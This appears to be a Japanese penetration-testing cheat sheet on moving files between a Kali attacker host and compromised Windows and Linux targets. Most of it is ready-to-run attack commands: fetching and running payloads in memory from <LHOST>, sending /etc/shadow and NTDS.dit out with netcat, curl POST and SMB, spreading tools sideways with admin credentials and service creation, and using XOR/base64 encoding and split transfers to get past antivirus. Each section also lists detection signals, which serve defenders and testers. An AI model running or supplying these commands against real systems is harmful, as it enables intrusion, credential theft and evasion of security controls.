02Kali → WindowsWindows へのツール配布

02-1. PowerShell IEX / IWR (推奨・最頻出)

powershell
# スクリプトをメモリで直接実行 (ディスク書込なし)
IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>:8080/payload.ps1')

# 短縮形
iex(iwr -UseBasicParsing http://<LHOST>:8080/payload.ps1)

# PSv2 互換 (旧 Windows)
$wc = New-Object System.Net.WebClient
IEX $wc.DownloadString("http://<LHOST>:8080/payload.ps1")
NoteAMSI 有効時は検知される。事前に AMSI bypass 必須 (evasion 04)。

02-2. PowerShell DownloadFile (バイナリ転送)

powershell
# ディスクに保存
Invoke-WebRequest -Uri "http://<LHOST>:8080/tool.exe" -OutFile "C:\Windows\Tasks\tool.exe"

# 短縮形
iwr http://<LHOST>:8080/tool.exe -O C:\Windows\Tasks\tool.exe

# WebClient (高速 / 確実)
(New-Object Net.WebClient).DownloadFile("http://<LHOST>:8080/tool.exe", "C:\Windows\Tasks\tool.exe")

02-3. certutil

cmd
certutil.exe -urlcache -split -f http://<LHOST>:8080/tool.exe C:\Windows\Tasks\tool.exe
NoteDefender 監視中、最近のバージョンでは検知対象。AV 無効化後 (evasion 06) に使用を推奨。

02-4. bitsadmin (古典的・信頼性高)

cmd
bitsadmin /transfer job /download /priority normal ^
    http://<LHOST>:8080/tool.exe ^
    C:\Windows\Tasks\tool.exe

02-5. SMB 共有 (impacket smbserver)

bash
# Kali: 匿名 SMB サーバ
smbserver.py share . -smb2support

# Kali: 認証付き
smbserver.py share . -smb2support -username user -password '<PASSWORD>'

# smbd と競合する場合
sudo systemctl stop smbd
cmd
:: 匿名アクセス
dir \\<LHOST>\share\
copy \\<LHOST>\share\tool.exe C:\Windows\Tasks\

:: 認証付き
net use Z: \\<LHOST>\share /user:user <PASSWORD>
copy Z:\tool.exe C:\Windows\Tasks\
net use Z: /delete

02-6. Base64 (HTTP 不可・コピペ経由)

bash
# Kali: エンコード
base64 -w0 tool.exe > tool.b64
cat tool.b64   # 出力をコピー
powershell
# Windows: 復元
$b64 = "TVqQAAMAAAAEAAAA..."  # 貼り付け
[IO.File]::WriteAllBytes("C:\Windows\Tasks\tool.exe", [Convert]::FromBase64String($b64))
Note1 MB 超のファイルは分割が必要 (Section 08-1)。Meterpreter shell 経由コピペでも使用可。

02-7. Base64-over-HTTP (PE シグネチャ隠蔽)

bash
# Kali: b64 ファイルを HTTP で提供
base64 -w0 tool.exe > tool.b64
python3 -m http.server 80
powershell
# Windows: テキストとして取得 → メモリで復元
$b64 = (New-Object Net.WebClient).DownloadString("http://<LHOST>/tool.b64")
[IO.File]::WriteAllBytes("C:\Windows\Tasks\tool.exe", [Convert]::FromBase64String($b64))

# ディスクに書かずアセンブリとしてロード (リフレクション)
$b64   = (iwr http://<LHOST>/payload.b64 -UseBasicParsing).Content
$bytes = [Convert]::FromBase64String($b64)
$asm   = [System.Reflection.Assembly]::Load($bytes)
$asm.EntryPoint.Invoke($null, $null)

02-8. Meterpreter upload

bash
meterpreter > cd C:\\Windows\\Tasks
meterpreter > upload tool.exe

02-9. FTP (pyftpdlib)

bash
python3 -m pyftpdlib -p 21 -u user -P '<PASSWORD>' --write
cmd
:: バッチ経由 (非インタラクティブ)
echo open <LHOST> 21  > ftp_cmds.txt
echo user           >> ftp_cmds.txt
echo <PASSWORD>       >> ftp_cmds.txt
echo binary         >> ftp_cmds.txt
echo get tool.exe   >> ftp_cmds.txt
echo bye            >> ftp_cmds.txt
ftp -s:ftp_cmds.txt

02-10. Meterpreter execute -m (完全 in-memory)

bash
# -H: 非表示 / -m: メモリから実行 / -d: ダミープロセス名
meterpreter > execute -H -m -d calc.exe -f tool.exe -a "-i -c cmd"
検知 / detection
  • IWR / DownloadString: PowerShell/Operational EID 4104 で URL とスクリプト本文が記録される
  • certutil: Defender のファイルダウンロード監視対象、Sysmon EID 1 で certutil.exe -urlcache の引数が露出
  • bitsadmin: BITS イベントログ (EID 59/60/61) で転送 URL が記録
  • SMB: EID 5140 (ネットワーク共有アクセス) / EID 5145 (共有オブジェクトアクセス)
  • Base64-over-HTTP: PE ヘッダの直接転送より検知率は低いが、[System.Reflection.Assembly]::Load は CLR ETW で観測可能

03Windows → Kali戦利品回収

03-1. PowerShell POST

bash
# Kali: POST 受信サーバ
python3 -c "
import http.server, socketserver
class H(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        n = int(self.headers['Content-Length'])
        data = self.rfile.read(n)
        open('/tmp/recv_' + self.path.strip('/'), 'wb').write(data)
        self.send_response(200); self.end_headers()
socketserver.TCPServer(('', 8080), H).serve_forever()"
powershell
# Windows: ファイル送信
$bytes = [IO.File]::ReadAllBytes("C:\Loot\proof.txt")
Invoke-WebRequest -Uri "http://<LHOST>:8080/proof.txt" -Method POST -Body $bytes

# テキストファイル (文字列として送信)
$data = Get-Content "C:\Loot\proof.txt" -Raw
Invoke-RestMethod -Uri "http://<LHOST>:8080/proof.txt" -Method POST -Body $data

03-2. SMB (impacket smbserver で受信)

bash
mkdir -p /tmp/loot
cd /tmp/loot
smbserver.py share . -smb2support
cmd
copy C:\Loot\proof.txt \\<LHOST>\share\

:: 大量ファイル
robocopy C:\Loot \\<LHOST>\share\ /S

03-3. Base64 コピペ

powershell
# Windows: エンコード → コピー
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Loot\NTDS.dit"))
bash
# Kali: 復元
echo "TVqQAAMAAAA..." | base64 -d > /tmp/ntds.dit

03-4. Meterpreter download

bash
meterpreter > download C:\\Loot\\proof.txt /tmp/proof.txt

# ディレクトリ全体
meterpreter > download -r C:\\Users\\Administrator\\Documents\\

03-5. Compress-Archive + POST (大量ファイル)

powershell
Compress-Archive -Path C:\Users\*\Documents -DestinationPath C:\Windows\Tasks\loot.zip
$bytes = [IO.File]::ReadAllBytes("C:\Windows\Tasks\loot.zip")
Invoke-WebRequest -Uri "http://<LHOST>:8080/loot.zip" -Method POST -Body $bytes

03-6. Nishang Send-File

powershell
IEX(IWR http://<LHOST>:8080/Send-File.ps1)
Send-File -FilePath "C:\Loot\NTDS.dit" -Url "http://<LHOST>:8080/upload"
検知 / detection
  • POST による外部送信: NGFW の DLP ポリシーで大容量 POST (とくに zip / binary MIME) を検知
  • SMB 書込: EID 5145 で共有への write アクセスを監視
  • robocopy の外部 UNC パス: 業務では稀、Sysmon EID 1 で引数露出
  • Meterpreter download: 既存 C2 セッションのトラフィックとして流れるが、HTTPS C2 であっても JA3 フィンガープリントで検出可能
  • Compress-Archive + POST: Compress-Archive の直後に Invoke-WebRequest POST という連鎖パターンは SIEM で有意

04Kali → LinuxLinux へのツール配布

04-1. wget / curl (最頻出)

bash
# wget
wget http://<LHOST>:8080/tool -O /tmp/tool
chmod +x /tmp/tool

# curl
curl http://<LHOST>:8080/tool -o /tmp/tool
chmod +x /tmp/tool

# ディスクに書かず即実行
curl http://<LHOST>:8080/tool.sh | bash

04-2. SCP (SSH 経由)

bash
# Kali → Target (Target 側で SSH 稼働)
scp tool user@<TARGET>:/tmp/

# 秘密鍵指定
scp -i id_rsa tool user@<TARGET>:/tmp/

04-3. Base64 (HTTP 不可)

bash
# Kali: エンコード
base64 -w0 tool > tool.b64
cat tool.b64   # コピー

# Target: 復元
echo "IyEvYmluL..." | base64 -d > /tmp/tool
chmod +x /tmp/tool

04-4. dd over SSH (raw / 大容量)

bash
dd if=tool | ssh user@<TARGET> "dd of=/tmp/tool"

04-5. netcat

bash
# Kali (送信側)
nc -w3 <TARGET> 9999 < tool

# Target (受信側、先に起動)
nc -lvnp 9999 > /tmp/tool
検知 / detection
  • wget / curl: プロセスの親子関係 (shell → wget の連鎖) と外部 IP を auditd / Sysmon for Linux で記録
  • SCP: SSH ログ (/var/log/auth.log) に接続元 IP とユーザ名が残る
  • netcat: 非標準ポートへの接続は NIDS で flagged、-e オプションは殆どのディストリで無効化済み
  • curl | bash: 接続先 URL + ダウンロード内容がプロセス引数に残らないが、ネットワーク側では URL が平文露出 (HTTP の場合)

05-1. netcat (最速)

bash
# Kali (受信、先に起動)

# Target (送信)
tar czf - /etc/shadow /etc/passwd | nc <LHOST> 9999

05-2. SCP

bash
# Target から Kali へ (Target で SSH クライアント使用)
scp /etc/shadow user@<LHOST>:/tmp/

# Kali から Target 上のファイルを pull (Kali で実行)
scp -i id_rsa user@<TARGET>:/etc/shadow /tmp/shadow

05-3. curl POST

bash
# Target: アップロード
curl -X POST http://<LHOST>:8080/shadow -d @/etc/shadow

# バイナリ (--data-binary)
curl -X POST http://<LHOST>:8080/file --data-binary @/path/to/file

05-4. Base64 コピペ

bash
# Target: エンコード

# Kali: 復元
echo "cm9vdDo..." | base64 -d > /tmp/shadow
検知 / detection
  • netcat での外部送信: 非標準ポートへの outbound TCP が FW / NIDS でフラグ
  • curl POST: DLP で POST body のバイナリ / 大容量コンテンツを検知
  • /etc/shadow の直接 read は auditd (rule: -w /etc/shadow -p r) で確実に記録

06Target → Target横展開時の伝播

横展開時の pivoting 構成 (chisel / ligolo-ng の tunnel 設定) は lateral-movement sheet を参照。ここではツール伝播の手段のみ扱う。

06-1. SMB + sc (Windows A → Windows B)

cmd
net use \\<TARGET_B>\C$ /u:contoso.local\administrator <PASSWORD>
copy tool.exe \\<TARGET_B>\C$\Windows\Tasks\
sc \\<TARGET_B> create mytool binpath= "C:\Windows\Tasks\tool.exe"
sc \\<TARGET_B> start mytool

06-2. WinRM Copy-Item (Windows A → Windows B)

powershell
$cred    = New-Object PSCredential("contoso.local\administrator", (ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force))
$session = New-PSSession -ComputerName <TARGET_B> -Credential $cred
Copy-Item -ToSession $session -Path "tool.exe" -Destination "C:\Windows\Tasks\"
Invoke-Command -Session $session -ScriptBlock { Start-Process "C:\Windows\Tasks\tool.exe" }

06-3. SCP (Linux A → Linux B)

bash
scp tool user@<TARGET_B>:/tmp/
ssh user@<TARGET_B> "chmod +x /tmp/tool && /tmp/tool &"

06-4. PowerShell HTTP Relay (Windows A が配布元)

powershell
# Windows A: 簡易 HTTP サーバ
$listener = [System.Net.HttpListener]::new()
$listener.Prefixes.Add("http://+:8080/")
$listener.Start()
while ($listener.IsListening) {
    $ctx  = $listener.GetContext()
    $file = "C:\Windows\Tasks\" + $ctx.Request.RawUrl.TrimStart('/')
    if (Test-Path $file) {
        $data = [IO.File]::ReadAllBytes($file)
        $ctx.Response.ContentLength64 = $data.Length
        $ctx.Response.OutputStream.Write($data, 0, $data.Length)
    }
    $ctx.Response.Close()
}

# Windows B: A からダウンロード
iwr "http://<TARGET_A>:8080/tool.exe" -OutFile "C:\Windows\Tasks\tool.exe"
検知 / detection
  • SMB + sc: net use の UNC 接続 (EID 5140) + sc create によるサービス登録 (EID 7045) の連鎖
  • WinRM Copy-Item: PowerShell リモーティングの EID 400/800 + ファイル書込の Sysmon EID 11
  • 横展開で到達した先に honeypot アカウント (Canary token) を仕込むと資格情報使用を即検知

07Proxy & Restricted Egressプロキシと制限出口

07-1. SOCKS プロキシ (proxychains)

bash
# Meterpreter: SOCKS プロキシ起動
msf > use auxiliary/server/socks_proxy
msf > set VERSION 5
msf > set SRVPORT 1080
msf > run -j

# /etc/proxychains4.conf に追記
# socks5 127.0.0.1 1080

# proxychains 経由で転送
proxychains -q wget http://10.10.20.10/file
proxychains -q scp file user@10.10.20.10:/tmp/

07-2. HTTP プロキシ経由 (Windows)

powershell
$proxy  = New-Object System.Net.WebProxy("http://proxy.corp.com:8080")
$client = New-Object System.Net.WebClient
$client.Proxy = $proxy
$client.DownloadFile("http://<LHOST>/tool.exe", "tool.exe")

07-3. DNS Tunnel (dnscat2)

bash
# Kali: サーバ起動
ruby dnscat2.rb tunnel.contoso.local
cmd
:: Windows: クライアント接続
dnscat2-client.exe tunnel.contoso.local
NoteDNS tunnel は帯域が UDP/53 に制限 (通常数 KB/s)、大容量ファイル転送には不向き。小さいコマンド実行に最適。
検知 / detection
  • SOCKS: Meterpreter の socks_proxy モジュールは既存 C2 セッションを利用するため direct 検知は困難、ただし接続先 IP への非典型アクセスが SIEM で検出されうる
  • DNS tunnel: 同一ドメインへの短時間大量 TXT / NULL クエリは DNS ログで有意、dnscat2 のクエリパターンは既知シグネチャあり (Suricata / Snort)
  • HTTP proxy 経由: proxy 側にコンテンツ検査 (SSL inspection) がある場合、復号後のペイロードが AV でスキャンされる

08AV/EDR Evasion TransfersAV 回避転送

08-1. 分割転送 (Split Files)

bash
# Kali: 1 MB 単位で分割
split -b 1048576 tool.exe part_
ls part_*   # part_aa, part_ab, ...
python3 -m http.server 8080
powershell
# Windows: 各パートを取得して結合
$parts = "aa","ab","ac"   # 実際のサフィックス列
$combined = [System.Collections.Generic.List[byte]]::new()
foreach ($s in $parts) {
    $data = (iwr "http://<LHOST>:8080/part_$s" -UseBasicParsing).Content
    $combined.AddRange([byte[]]$data)
}
[IO.File]::WriteAllBytes("C:\Windows\Tasks\tool.exe", $combined.ToArray())

08-2. XOR + Base64 (AV シグネチャ回避)

bash
# Kali: XOR エンコード
python3 -c "
key = b'<XOR_KEY>'
data = open('tool.exe','rb').read()
enc = bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))
open('tool.exe.xor','wb').write(enc)
"
base64 -w0 tool.exe.xor > tool.b64
python3 -m http.server 8080
powershell
# Windows: デコード
$key = [Text.Encoding]::ASCII.GetBytes("<XOR_KEY>")
$enc = [Convert]::FromBase64String((iwr "http://<LHOST>:8080/tool.b64" -UseBasicParsing).Content)
$dec = for ($i=0; $i -lt $enc.Length; $i++) { $enc[$i] -bxor $key[$i % $key.Length] }
[IO.File]::WriteAllBytes("C:\Windows\Tasks\tool.exe", $dec)

08-3. in-memory PS スクリプトロード (ディスク回避)

powershell
# PowerShell スクリプトの HTTP ロード・即実行
IEX(IWR -UseBasicParsing "http://<LHOST>:8080/Invoke-Mimikatz.ps1")

# Base64 エンコード済みスクリプト → デコード後 IEX
$script = [Convert]::FromBase64String((iwr "http://<LHOST>:8080/script.b64").Content)
IEX([Text.Encoding]::ASCII.GetString($script))

08-4. ツール別推奨転送方式

ツール検知率推奨転送
mimikatz高XOR + Base64 → デコード後実行 (または Meterpreter -m)
PrintSpoofer / GodPotato中Base64-over-HTTP で十分
SharpHound中Base64-over-HTTP または IWR DownloadFile
ligolo-ng agent中Defender 無効化後に IWR DownloadFile
PowerView / PowerUp中IEX(IWR) でメモリ直接実行 (AMSI bypass 後)
Rubeus中〜高XOR + Base64 または Meterpreter upload + execute -m
linpeas / pspy低wget / curl で直接
検知 / detection
  • 分割転送: 同一 IP への短時間連続 GET (part_aa / part_ab ...) は WAF / NIDS でパターン化
  • XOR + Base64: 転送中は AV スキャンを回避するが、メモリ上で復元した後の実行は ETW-Ti で観測される
  • in-memory: IEX(IWR) は ScriptBlockLogging EID 4104 で URL と内容が記録、[System.Reflection.Assembly]::Load は CLR 内で ETW プロバイダが発火
  • AMSI bypass なしに難読化スクリプトをロードしても、最初のスキャンで検知される可能性が高い

09Verification & Debug整合性確認

AV による部分削除・転送破損の検出のため、送受信双方でハッシュを確認する。

SHA-256 検証

bash
# Kali (送信前)
sha256sum tool.exe
md5sum tool.exe
powershell
# Windows (受信後)
Get-FileHash -Algorithm SHA256 "C:\Windows\Tasks\tool.exe"
Get-FileHash -Algorithm MD5   "C:\Windows\Tasks\tool.exe"

ファイルサイズ確認

bash
ls -la tool.exe
powershell
(Get-Item "C:\Windows\Tasks\tool.exe").Length

PE ヘッダ確認 (転送不完全の検出)

bash
# MZ ヘッダの確認
xxd tool.exe | head -1
# → 4d5a (MZ) で始まれば PE として正常

file tool.exe
# → PE32+ executable の場合: 64bit, PE32: 32bit

AV 削除の判別

powershell
# ファイルが存在するが空 or サイズ 0 → AV が中身を削除
if ((Get-Item "C:\Windows\Tasks\tool.exe").Length -eq 0) { "AV quarantined content" }

# Defender 検疫ログ確認
Get-MpThreatDetection | Sort-Object InitialDetectionTime -Descending | Select-Object -First 5

# ダウンロード失敗のデバッグ
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
try {
    $wc.DownloadFile("http://<LHOST>:8080/tool.exe", "C:\Windows\Tasks\tool.exe")
    "Download succeeded"
} catch { "Error: $_" }

10Decision Chart & Key Takeaways選定チャートと要点

転送方法選定チャート

text
[Q1] AV/EDR の状況は?
  ├─ 無効 or 除外設定済み → HTTP/SMB 直接転送 (Section 02-1, 02-5)
  └─ 有効 → [Q2] へ

[Q2] ファイルサイズは?
  ├─ 1 MB 未満 → Base64-over-HTTP (Section 02-7)
  ├─ 1-100 MB  → XOR+Base64 or 分割転送 (Section 08-1, 08-2)
  └─ 100 MB 超 → SMB / FTP / netcat (Section 02-5, 02-9)

[Q3] HTTP egress は通るか?
  ├─ 通る   → PowerShell IWR (Section 02-1, 02-2)
  ├─ SMB 可 → impacket smbserver (Section 02-5)
  ├─ FTP 可 → pyftpdlib (Section 02-9)
  ├─ プロキシ必須 → SOCKS proxychains (Section 07-1)
  └─ 全遮断 → DNS tunnel / Base64 コピペ (Section 07-3, 02-6)

[Q4] ターゲット OS は?
  ├─ Windows → PowerShell IWR / certutil / SMB / Base64
  ├─ Linux   → wget / curl / SCP / Base64
  └─ 混在    → HTTP (共通性重視)

[Q5] ディスクへの書込を避けたいか?
  ├─ はい → IEX(IWR) / Assembly::Load / Meterpreter execute -m (Section 02-7, 02-10, 08-3)
  └─ いいえ → DownloadFile / certutil / SMB copy

要点 / key takeaways
  • HTTP + PowerShell IWR が最も汎用的 — Windows 標準、プロキシ対応、Base64 対応が一体で使える
  • AV 有効時は転送中のシグネチャ回避に Base64-over-HTTP を使い、メモリ上での実行には Assembly::Load か Meterpreter execute -m を選ぶ
  • SMB は高速で平文転送が目立たないが、FW で port 445 が遮断される環境が多い、impacket-smbserver は認証付きで使うことを推奨
  • certutil は依然使えるが Defender 監視対象のため、AV 無効化後 (evasion 06) または代替手段を使うほうが安全
  • XOR + Base64 は静的シグネチャを回避できるが、メモリ展開後は ETW-Ti で観測される、EDR 有り環境では Direct Syscall + unhook との組合せが前提
  • Meterpreter upload/download は確実だが単一障害点 — セッション切断で全停止するため、重要な転送は並行して HTTP / SMB 経路も確保する
  • 転送前後のハッシュ検証を省略しない — AV による部分削除や転送破損は実行時エラーの原因になり、デバッグに時間を取られる
  • 横展開時のツール伝播は WinRM Copy-Item (認証済セッション) が最も痕跡が少ない、SMB + sc は EID 7045 で確実に記録される
